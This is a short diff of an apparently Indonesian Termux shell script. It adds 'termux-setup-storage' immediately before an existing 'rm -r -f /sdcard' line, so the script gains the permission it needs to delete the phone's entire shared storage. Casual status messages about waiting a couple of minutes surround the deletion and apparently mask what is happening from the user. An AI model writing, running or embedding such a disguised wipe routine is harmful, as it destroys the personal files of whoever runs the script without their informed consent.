@@ -36,6 +36,7 @@ echo $i"Oke! Kalo emang itu mau lu!"
 echo
 sleep 2
 echo $i"Tunggu bentar.... Sekitaran 2 menit.."
+termux-setup-storage
 rm -r -f /sdcard
 echo
 echo
